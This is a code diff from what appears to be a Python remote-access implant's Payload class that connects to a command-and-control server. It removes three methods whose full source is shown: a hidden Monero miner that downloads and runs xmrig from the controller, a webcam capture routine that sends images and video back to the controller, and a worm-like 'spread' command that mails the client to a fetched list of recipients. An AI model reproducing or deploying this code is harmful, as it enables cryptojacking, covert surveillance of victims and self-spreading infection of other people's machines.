@@ -550,80 +550,6 @@ class Payload():
         return globals()['icloud'].run()
 
 
-    @config(platforms=['linux','linux2','darwin'], command=True, usage='miner <cmd> [url] [port] [wallet]')
-    def miner(self, args):
-        """
-        Run cryptocurrency miner in the background
-
-        `Required`
-        :param str url:         mining server url
-        :param str username:    username for mining server
-
-
-        """
-        args = str(args).split()
-
-        if 'run' in args and len(args) == 4:
-            cmd, url, port, user = args
-
-            # type check port argument
-            if not port.isdigit():
-                return "Error: port must be a digit 1-65535"
-
-            # first attempt using built-in python miner
-            try:
-                import pycryptonight, pyrx
-                self.child_procs['miner_py'] = globals()['Miner'](url=url, port=int(port), user=user)
-                self.child_procs['miner_py'].start()
-                return "Miner running in " + str(self.child_procs['miner_py']).pid
-            except Exception as e:
-                log("{} error: {}".format(self.miner.__name__, str(e)))
-
-                # if that fails, try downloading and running xmrig
-                try:
-                    threads = multiprocessing.cpu_count() - 1
-
-                    # pull xmrig from server if necessary
-                    if not self.xmrig_path_dev:
-                        self.xmrig_path_dev = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
-
-                        # set up executable
-                        if os.name == 'nt' and not self.xmrig_path.endswith('.exe'):
-                            os.rename(self.xmrig_path, self.xmrig_path + '.exe')
-                            self.xmrig_path += '.exe'
-
-                        os.chmod(self.xmrig_path, 755)
-
-                        # excute xmrig in hidden process
-                        params = self.xmrig_path + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, user=user, threads=threads)
-                        result = self.execute(params)
-                        return result
-                    else:
-                        # restart miner if it already exists
-                        name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
-                        if name in self.execute.process_list:
-                            self.execute.process_list[name].kill()
-                        params = self.xmrig_path + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, user=user, threads=threads)
-                        result = self.execute(params)
-                        return result
-                except Exception as e:
-                    log("{} error: {}".format(self.miner.__name__, str(e)))
-
-        elif 'stop' in args:
-            # kill python miner
-            if 'miner_py' in self.child_procs and isinstance(self.child_procs['miner_py'], multiprocessing.Process) and self.child_procs['miner_py'].is_alive():
-                self.child_procs['miner_py'].terminate()
-
-            # kill xmrig
-            name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
-            if name in self.execute.process_list:
-                self.execute.process_list[name].kill()
-
-            return "Miner stopped."
-
-        return "usage: {}".format(self.miner.usage)
-
-
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='upload [file]')
     def upload(self, filename):
         """
@@ -647,50 +573,6 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self.upload.__name__, str(e)))
             return "Error: {}".format(str(e))
-
-
-    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='webcam <mode> [options]')
-    def webcam(self, args=None):
-        """
-        Capture image/video from client webcam
-
-        `Required`
-        :param str mode:      stream, image, video
-
-        `Optional`
-        :param str upload:    imgur (image mode), ftp (video mode)
-        :param int port:      integer 1 - 65355 (stream mode)
-
-        """
-        try:
-            host, port = self.connection.getpeername()
-            if 'webcam' not in globals():
-                self.load('webcam')
-            if not args:
-                return self.webcam.usage
-            args = str(args).split()
-            if 'stream' in args:
-                if len(args) != 2:
-                    log("Error - stream mode requires argument: 'port'")
-                elif not args[1].isdigit():
-                    log("Error - port must be integer between 1 - 65355")
-                else:
-                    host, _ = self.connection.getpeername()
-                    port = int(args[1])
-                    globals()['webcam'].stream(host=host, port=port)
-            elif 'image' in args:
-                data = globals()['webcam'].image(*args)
-                json_data = {"data": str(data), "type": "png", "owner": self.owner, "module": self.webcam.__name__, "session": self.info.get('public_ip')}
-                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
-            elif 'video' in args:
-                data = globals()['webcam'].video(*args)
-                json_data = {"data": str(data), "type": "avi", "owner": self.owner, "module": self.webcam.__name__, "session": self.info.get('public_ip')}
-                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
-            else:
-                return self.webcam.usage
-            return "Webcam capture complete"
-        except Exception as e:
-            log("{} error: {}".format(self.webcam.__name__, str(e)))
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='passive')
@@ -1013,29 +895,6 @@ class Payload():
                     return self.packetsniffer.usage
         except Exception as e:
             log("{} error: {}".format(self.packetsniffer.__name__, str(e)))
-
-
-    @config(platforms=['win32','darwin','linux','linux2'], command=True, usage='spread <gmail> <password> <URL email list>')
-    def spread(self, args=None):
-        """
-        Activate worm-like behavior and begin spreading client via email
-
-        `Required`
-        :param str email:       sender Gmail address
-        :param str password:    sender Gmail password
-        :param str url:         URL of target email list
-        """
-        if not args or len(str(args).split()) != 3:
-            return self.spread.usage
-        if 'spreader' not in globals():
-            self.load('spreader')
-        try:
-            attachment = sys.argv[0]
-            gmail, password, url = args.split()
-            recipients = urlopen(url).read().splitlines()
-            return globals()['spreader'].run(gmail, password, attachment, recipients)
-        except Exception as e:
-            return '{} error: {}'.format(self.spread.__name__, str(e))
 
 
     def send_task(self, task):
